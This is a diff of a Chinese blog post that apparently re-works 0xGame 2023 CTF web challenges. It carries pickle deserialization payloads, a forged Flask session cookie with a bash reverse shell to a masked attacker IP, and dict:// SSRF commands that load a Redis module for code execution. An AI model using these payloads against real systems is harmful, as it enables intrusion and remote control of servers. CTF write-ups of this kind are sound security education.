@@ -16,12 +16,12 @@
   <meta name="author" content="Zer0peach">
   <meta name="keywords" content="">
   
-    <meta name="description" content="0xGame 2023 前言 本来是参加了的，但是十月份招新赛太多，而且打CNSS的招新赛耗费了不少精力，所以0xGame就随便看了第一周的，本来以为没什么，但是打完鹏城杯后，看了一个南京邮电大学的web师傅wp，顺便看到了0xGame的wp，看完之后大喊可惜啊，考点非常全面，在我心里能够和CNSS媲美了 不过一个大二的人了做新生赛还这么困难，感觉快废了（呜呜呜呜呜）  第一周就说一个题吧，其他的">
+    <meta name="description" content="0xGame 2023 （复现） 前言 本来是参加了的，但是十月份招新赛太多，而且打CNSS的招新赛耗费了不少精力，所以0xGame就随便看了第一周的，本来以为没什么，但是打完鹏城杯后，看了一个南京邮电大学的web师傅wp，顺便看到了0xGame的wp，看完之后大喊可惜啊，考点非常全面，在我心里能够和CNSS媲美了 不过一个大二的人了做新生赛还这么困难，感觉快废了（呜呜呜呜呜）  第一周就说一个题">
 <meta property="og:type" content="article">
 <meta property="og:title" content="0xGAME-WEB 复现">
 <meta property="og:url" content="https://zer0peach.github.io/2023/11/21/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/index.html">
 <meta property="og:site_name" content="Zer0peach can&#39;t think">
-<meta property="og:description" content="0xGame 2023 前言 本来是参加了的，但是十月份招新赛太多，而且打CNSS的招新赛耗费了不少精力，所以0xGame就随便看了第一周的，本来以为没什么，但是打完鹏城杯后，看了一个南京邮电大学的web师傅wp，顺便看到了0xGame的wp，看完之后大喊可惜啊，考点非常全面，在我心里能够和CNSS媲美了 不过一个大二的人了做新生赛还这么困难，感觉快废了（呜呜呜呜呜）  第一周就说一个题吧，其他的">
+<meta property="og:description" content="0xGame 2023 （复现） 前言 本来是参加了的，但是十月份招新赛太多，而且打CNSS的招新赛耗费了不少精力，所以0xGame就随便看了第一周的，本来以为没什么，但是打完鹏城杯后，看了一个南京邮电大学的web师傅wp，顺便看到了0xGame的wp，看完之后大喊可惜啊，考点非常全面，在我心里能够和CNSS媲美了 不过一个大二的人了做新生赛还这么困难，感觉快废了（呜呜呜呜呜）  第一周就说一个题">
 <meta property="og:locale" content="zh_CN">
 <meta property="og:image" content="https://zer0peach.github.io/images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231121233431755.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231121233909751.png">
@@ -41,7 +41,7 @@
 <meta property="og:image" content="https://zer0peach.github.io/images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231123154925022.png">
 <meta property="og:image" content="https://zer0peach.github.io/images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231123000646246.png">
 <meta property="article:published_time" content="2023-11-21T15:22:13.000Z">
-<meta property="article:modified_time" content="2023-11-27T09:23:54.746Z">
+<meta property="article:modified_time" content="2023-12-06T12:30:36.710Z">
 <meta property="article:author" content="Zer0peach">
 <meta name="twitter:card" content="summary_large_image">
 <meta name="twitter:image" content="https://zer0peach.github.io/images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231121233431755.png">
@@ -260,7 +260,7 @@
         
         
         
-          278 分钟
+          279 分钟
         
       </span>
     
@@ -302,7 +302,7 @@
             
               <div class="markdown-body">
                 
-                <h1 id="0xGame-2023"><a href="#0xGame-2023" class="headerlink" title="0xGame 2023"></a>0xGame 2023</h1><blockquote>
+                <h1 id="0xGame-2023-（复现）"><a href="#0xGame-2023-（复现）" class="headerlink" title="0xGame 2023 （复现）"></a>0xGame 2023 （复现）</h1><blockquote>
 <p>前言</p>
 <p>本来是参加了的，但是十月份招新赛太多，而且打CNSS的招新赛耗费了不少精力，所以0xGame就随便看了第一周的，本来以为没什么，但是打完鹏城杯后，看了一个南京邮电大学的web师傅wp，顺便看到了0xGame的wp，看完之后大喊可惜啊，考点非常全面，在我心里能够和CNSS媲美了</p>
 <p>不过一个大二的人了做新生赛还这么困难，感觉快废了（呜呜呜呜呜）</p>
@@ -858,11 +858,12 @@ b&#x27;<span class="hljs-number">76</span><span class="hljs-keyword">c</span><sp
 <blockquote>
 <p>首先, 如果你使用 <code>pickle.dumps()</code> 来生成 payload, 那么你得知道不同操作系统生成的 pickle 序列化数据是有区别的</p>
 <p>参考: <a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7436">https://xz.aliyun.com/t/7436</a></p>
-<div class="code-wrapper"><pre><code class="hljs taggerscript"># Linux (注意 posix) b&#x27;cposix<span class="hljs-symbol">\n</span>system<span class="hljs-symbol">\n</span>p0<span class="hljs-symbol">\n</span>(Vwhoami<span class="hljs-symbol">\n</span>p1<span class="hljs-symbol">\n</span>tp2<span class="hljs-symbol">\n</span>Rp3<span class="hljs-symbol">\n</span>.&#x27; # Windows (注意 nt) b&#x27;cnt<span class="hljs-symbol">\n</span>system<span class="hljs-symbol">\n</span>p0<span class="hljs-symbol">\n</span>(Vwhoami<span class="hljs-symbol">\n</span>p1<span class="hljs-symbol">\n</span>tp2<span class="hljs-symbol">\n</span>Rp3<span class="hljs-symbol">\n</span>.&#x27;</code></pre></div>
+<div class="code-wrapper"><pre><code class="hljs taggerscript"># Linux (注意 posix) b&#x27;cposix<span class="hljs-symbol">\n</span>system<span class="hljs-symbol">\n</span>p0<span class="hljs-symbol">\n</span>(Vwhoami<span class="hljs-symbol">\n</span>p1<span class="hljs-symbol">\n</span>tp2<span class="hljs-symbol">\n</span>Rp3<span class="hljs-symbol">\n</span>.&#x27; 
+# Windows (注意 nt) b&#x27;cnt<span class="hljs-symbol">\n</span>system<span class="hljs-symbol">\n</span>p0<span class="hljs-symbol">\n</span>(Vwhoami<span class="hljs-symbol">\n</span>p1<span class="hljs-symbol">\n</span>tp2<span class="hljs-symbol">\n</span>Rp3<span class="hljs-symbol">\n</span>.&#x27;</code></pre></div>
 
 <p>在 Windows 上生成的 pickle payload 无法在 Linux 上运行</p>
 <p>当然如果手动去构造 opcode, 那是没有这个问题的, 比如这段 opcode</p>
-<div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-string">b&#x27;&#x27;&#x27;cos system (S&#x27;whoami&#x27; tR.&#x27;&#x27;&#x27;</span></code></pre></div>
+<div class="code-wrapper"><pre><code class="hljs awk"><span class="hljs-string">b&#x27;&#x27;&#x27;cos\nsystem\n(S&#x27;whoami&#x27;\ntR.&#x27;&#x27;&#x27;</span></code></pre></div>
 
 <p>其次, 很多人过来问为什么构造了恶意 pickle 序列化数据发送之后服务器报错 500, 其实这个是正常现象, 没啥问题</p>
 <p>上面代码在 <code>pickle.loads()</code> 之后得到 note 对象, 然后访问它的 id, name, content 属性, 即 <code>note.id</code>, <code>note.name</code>, <code>note.content</code></p>
@@ -871,9 +872,9 @@ b&#x27;<span class="hljs-number">76</span><span class="hljs-keyword">c</span><sp
 <div class="code-wrapper"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle
 
 <span class="hljs-keyword">class</span> <span class="hljs-title class_">A</span>:
-  <span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):
-    <span class="hljs-keyword">return</span> (<span class="hljs-built_in">str</span>, (<span class="hljs-string">&quot;123&quot;</span>, ))
-  
+	<span class="hljs-keyword">def</span> <span class="hljs-title function_">__reduce__</span>(<span class="hljs-params">self</span>):
+ 		<span class="hljs-keyword">return</span> (<span class="hljs-built_in">str</span>, (<span class="hljs-string">&quot;123&quot;</span>, ))
+
 s = pickle.dumps(A(), protocol=<span class="hljs-number">0</span>)
 obj = pickle.loads(s)
 <span class="hljs-built_in">print</span>(obj) <span class="hljs-comment"># 123</span></code></pre></div>
@@ -901,19 +902,19 @@ obj = pickle.loads(s)
 
 
 
+<p>并且上面说到反弹shell说的很好，一定要加上<code>bash -c</code>，直接<code>bash -i</code>是不行的，但我在CNSS是可以直接<code>bash -i</code>的，现在想来应该是CNSS恰好用的是<code>bash</code>，而该题目应该用的是其他<code>shell</code>，要加上<code>bash -c</code>让他被bash解析</p>
 <div class="code-wrapper"><pre><code class="hljs csp">flask-unsign --sign --cookie &quot;&#123;<span class="hljs-string">&#x27;notes&#x27;</span>: &#123;<span class="hljs-string">&#x27;evil&#x27;</span>: b<span class="hljs-string">&#x27;&#x27;</span><span class="hljs-string">&#x27;cos\nsystem\n(S&#x27;</span>bash -c \&quot;bash -i &gt;&amp; /dev/tcp/xx.xxx.xx.xx/4444 0&gt;&amp;1\&quot;<span class="hljs-string">&#x27;\ntR.&#x27;</span><span class="hljs-string">&#x27;&#x27;</span>&#125;&#125;&quot; --secret 6061 --no-literal-eval</code></pre></div>
 
 <p>要加上<code>--no-literal-eval</code>，不然生成结果不一样</p>
-<p>并且上面说到反弹shell说的很好，一定要加上<code>bash -c</code>，直接<code>bash -i</code>是不行的，但我在CNSS是可以直接<code>bash -i</code>的，现在想来应该是CNSS恰好用的是<code>bash</code>，而该题目应该用的是其他<code>shell</code>，要加上<code>bash -c</code>让他被bash解析</p>
 <p>再说明一下，要在linux环境下运行才可以（当然出题人的mac也行），</p>
-<p>windows下是无法使用\进行转义的</p>
+<p>windows下是无法使用<code>\</code>进行转义的</p>
 <p>在 Windows 的 cmd 中，如果你已经使用了双引号括起整个字符串，而字符串内部又需要包含双引号，可以<strong>使用两个双引号来表示一个双引号</strong>。这是 Windows 命令行的规则。</p>
 <p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122111735938.png" srcset="/img/loading.gif" lazyload alt="image-20231122111735938"></p>
 <h2 id="RSS-parser"><a href="#RSS-parser" class="headerlink" title="RSS parser"></a>RSS parser</h2><p>搜一下就知道RSS语法与xml有关，于是想到XXE漏洞</p>
 <p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122123119964.png" srcset="/img/loading.gif" lazyload alt="image-20231122123119964"></p>
 <p>无法直接读取&#x2F;flag，随便输入以http或https开头的url，能看到是flask的debug页面</p>
 <p>于是算pin码</p>
-<p>但这里奇怪的是wp中说&#x2F;etc&#x2F;machine-id是没有值的，但我用docker启动题目是可以读取到值的</p>
+<p>但这里奇怪的是wp中说<code>/etc/machine-id</code>是没有值的，但我用docker启动题目是可以读取到值的</p>
 <p>不说了，没一次是算对的</p>
 <h2 id="zip-manager"><a href="#zip-manager" class="headerlink" title="zip_manager"></a>zip_manager</h2><p>服了，题目给的docker启动了，访问不了，挺想做的</p>
 <p>题目实现了在线解压缩 zip 文件的功能, 但是不能进行目录穿越</p>
@@ -1002,7 +1003,11 @@ header(&#x27;Location: gopher://db:<span class="hljs-number">6379</span>/_<span 
 <p>其次在使用 gopher 发送 redis 命令的时候记得结尾加上 <code>quit</code>, 不然会一直卡住</p>
 <p>然后注意 redis 的主机名是 <code>db</code>, 而不是 <code>127.0.0.1</code>, 因此访问 redis 数据库得用 <code>db:6379</code></p>
 <p>如果用 dict 协议打的话, 得调整一下 payload 顺序</p>
-<div class="code-wrapper"><pre><code class="hljs ruby"><span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/db:6379/config</span><span class="hljs-symbol">:set</span><span class="hljs-symbol">:dir</span><span class="hljs-symbol">:/tmp</span> <span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/db:6379/config</span><span class="hljs-symbol">:set</span><span class="hljs-symbol">:dbfilename</span><span class="hljs-symbol">:exp</span>.so <span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/db:6379/slaveof</span><span class="hljs-symbol">:host</span>.docker.<span class="hljs-symbol">internal:</span><span class="hljs-number">21000</span> <span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/db:6379/module</span><span class="hljs-symbol">:load</span><span class="hljs-symbol">:/tmp/exp</span>.so <span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/db:6379/slave</span><span class="hljs-symbol">:no</span><span class="hljs-symbol">:one</span> <span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/db:6379/system</span>.<span class="hljs-symbol">exec:</span>env <span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/db:6379/module</span><span class="hljs-symbol">:unload</span><span class="hljs-symbol">:system</span></code></pre></div>
+<div class="code-wrapper"><pre><code class="hljs ruby"><span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/db:6379/config</span><span class="hljs-symbol">:set</span><span class="hljs-symbol">:dir</span><span class="hljs-symbol">:/tmp</span> 
+<span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/db:6379/config</span><span class="hljs-symbol">:set</span><span class="hljs-symbol">:dbfilename</span><span class="hljs-symbol">:exp</span>.so <span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/db:6379/slaveof</span><span class="hljs-symbol">:host</span>.docker.<span class="hljs-symbol">internal:</span><span class="hljs-number">21000</span> <span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/db:6379/module</span><span class="hljs-symbol">:load</span><span class="hljs-symbol">:/tmp/exp</span>.so 
+<span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/db:6379/slave</span><span class="hljs-symbol">:no</span><span class="hljs-symbol">:one</span> 
+<span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/db:6379/system</span>.<span class="hljs-symbol">exec:</span>env 
+<span class="hljs-symbol">dict:</span>/<span class="hljs-regexp">/db:6379/module</span><span class="hljs-symbol">:unload</span><span class="hljs-symbol">:system</span></code></pre></div>
 
 <p>因为每次执行命令之间会存在一定的时间间隔, 所以得先设置 dir 和 dbfilename, 然后再 slaveof, 不然最终同步的文件名和路径还是原来的 <code>/data/dump.rdb</code></p>
 </blockquote>
@@ -1032,7 +1037,8 @@ header(&#x27;Location: gopher://db:<span class="hljs-number">6379</span>/_<span 
 <p>查阅相关文档可以知道 int64 类型的范围是 <code>-9223372036854775808 ~ 9223372036854775807</code></p>
 <p>经过简单的计算或者瞎猜, 可以购买数量为 <code>922337203695477808</code> 的 apple</p>
 </blockquote>
-<p>就是让<code>product.Price*int64(n)</code>的结果产生溢出，变为负数通过判断，并且变为负数money也会不断增加</p>
+<p>因为<code>product.Price</code>也是int64</p>
+<p>可以让<code>product.Price*int64(n)</code>的结果产生溢出，变为负数通过判断，并且变为负数money也会不断增加</p>
 <p>也可以直接让<code>n</code>产生溢出，这样money会加的很少，但数量会变得很大，然后卖掉即可</p>
 <h1 id="第四周-（java安全专题，但与gadget无关）"><a href="#第四周-（java安全专题，但与gadget无关）" class="headerlink" title="第四周 （java安全专题，但与gadget无关）"></a>第四周 （java安全专题，但与gadget无关）</h1><p>因为一直在学java，没怎么做过题目，所以看到是专题时挺感兴趣的</p>
 <h2 id="spring"><a href="#spring" class="headerlink" title="spring"></a>spring</h2><p><img src="/../images/0xGAME-WEB-%E5%A4%8D%E7%8E%B0/image-20231122181651148.png" srcset="/img/loading.gif" lazyload alt="image-20231122181651148"></p>
